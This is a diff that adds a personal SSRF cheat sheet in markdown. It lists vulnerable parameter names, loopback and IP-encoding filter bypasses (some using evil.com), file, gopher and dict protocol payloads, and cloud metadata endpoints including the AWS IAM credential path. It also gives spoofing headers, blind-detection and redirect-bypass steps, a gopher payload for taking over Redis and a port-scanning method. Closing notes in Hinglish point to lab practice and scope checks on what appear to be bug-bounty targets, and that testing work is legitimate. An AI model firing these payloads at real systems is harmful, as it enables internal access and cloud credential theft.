@@ -1,0 +1,115 @@
+# SSRF — Complete Reference (Headers, Payloads, Commands)
+
+## 1. Common SSRF-Prone Parameters
+| Parameter Name | Where Found |
+|---|---|
+| url, uri, path, dest | Redirect/fetch features |
+| next, redirect, return, returnUrl | Login/logout redirects |
+| src, source, image, avatar | Image proxy/upload from URL |
+| feed, host, port, api, endpoint | Webhooks, integrations |
+| callback, webhook | API integrations |
+| domain, target, page | PDF generators, screenshot tools |
+
+---
+
+## 2. Basic SSRF Payloads
+| Payload | Purpose |
+|---|---|
+| `http://127.0.0.1/` | Localhost check |
+| `http://localhost/` | Localhost check (alt) |
+| `http://0.0.0.0/` | Localhost check (alt) |
+| `http://[::1]/` | IPv6 localhost |
+| `http://127.1/` | Shortened loopback |
+
+---
+
+## 3. IP Obfuscation / Filter Bypass Payloads
+| Technique | Example |
+|---|---|
+| Decimal IP | `http://2130706433/` (= 127.0.0.1) |
+| Octal IP | `http://0177.0.0.1/` |
+| Hex IP | `http://0x7f.0x0.0x0.0x1/` |
+| Mixed encoding | `http://0x7f000001/` |
+| IPv6-mapped | `http://[::ffff:127.0.0.1]/` |
+| URL with credentials | `http://evil.com@127.0.0.1/` |
+| Fragment trick | `http://127.0.0.1#@evil.com/` |
+| Subdomain trick | `http://127.0.0.1.evil.com/` |
+| DNS rebinding | Domain resolves safe → rebinds to internal IP after TTL expiry |
+
+---
+
+## 4. Protocol Smuggling Payloads
+| Protocol | Example | Use |
+|---|---|---|
+| `file://` | `file:///etc/passwd` | Local file read |
+| `gopher://` | `gopher://127.0.0.1:6379/_%0d%0aSET%20key%20value%0d%0a` | Raw TCP payload (Redis exploitation) |
+| `dict://` | `dict://127.0.0.1:11211/stat` | Memcached probing |
+| `ftp://` | `ftp://127.0.0.1/` | Internal FTP probing |
+
+---
+
+## 5. Cloud Metadata Endpoints
+| Cloud | Endpoint |
+|---|---|
+| AWS | `http://169.254.169.254/latest/meta-data/` |
+| AWS IAM creds | `http://169.254.169.254/latest/meta-data/iam/security-credentials/` |
+| Azure | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` (needs header `Metadata: true`) |
+| GCP | `http://metadata.google.internal/computeMetadata/v1/` (needs header `Metadata-Flavor: Google`) |
+| Alibaba Cloud | `http://100.100.100.200/latest/meta-data/` |
+
+---
+
+## 6. Required Headers for Metadata SSRF
+| Header | Cloud | Purpose |
+|---|---|---|
+| `Metadata: true` | Azure | Mandatory to access metadata service |
+| `Metadata-Flavor: Google` | GCP | Mandatory to access metadata service |
+| `X-Forwarded-For: 127.0.0.1` | Generic | Bypass IP-based restrictions |
+| `X-Forwarded-Host: 127.0.0.1` | Generic | Host header override |
+| `X-Originating-IP: 127.0.0.1` | Generic | Legacy filter bypass |
+| `X-Remote-IP: 127.0.0.1` | Generic | Legacy filter bypass |
+| `X-Client-IP: 127.0.0.1` | Generic | Legacy filter bypass |
+| `X-Real-IP: 127.0.0.1` | Generic | Reverse proxy trust bypass |
+
+---
+
+## 7. Blind SSRF Detection (Burp Collaborator)
+| Step | Action |
+|---|---|
+| 1 | Burp → Collaborator client → Copy payload (e.g. `abcd1234.burpcollaborator.net`) |
+| 2 | Inject into suspected SSRF param: `http://abcd1234.burpcollaborator.net/` |
+| 3 | Send request, wait, click "Poll now" in Collaborator |
+| 4 | DNS/HTTP interaction shown = confirmed blind SSRF |
+
+---
+
+## 8. Redirect-Based Filter Bypass
+| Step | Action |
+|---|---|
+| 1 | Host a simple server (or use `http://your-vps/redirect`) |
+| 2 | Set 302 redirect → `http://127.0.0.1/admin` |
+| 3 | Submit your server's URL as the SSRF param |
+| 4 | If app follows redirect blindly → filter bypassed |
+
+---
+
+## 9. SSRF → RCE via Redis (Gopher)
+```
+gopher://127.0.0.1:6379/_%0d%0aSET%20key%20value%0d%0a
+```
+Used to write malicious cron jobs or SSH keys once Redis is reachable internally — advance chaining technique, practice this only inside labs first.
+
+---
+
+## 10. Port Scanning via SSRF
+| Approach | Detail |
+|---|---|
+| Response timing | Closed port = fast fail; open port = slower/different response |
+| Error message diff | Compare error text for open vs closed port responses |
+| Loop through common ports | 22, 80, 443, 3306, 6379, 8080, 9200, 11211 |
+
+---
+
+## Notes
+- Practice order pehle PortSwigger labs → phir yeh advance payloads apply karo.
+- Real targets ([[banco-plata-target]], [[syfe-target]]) pe use karne se pehle scope rules zaroor check karo — blind SSRF confirm karne ke liye sirf apna Collaborator use karo, kisi third-party internal system ko touch mat karo.
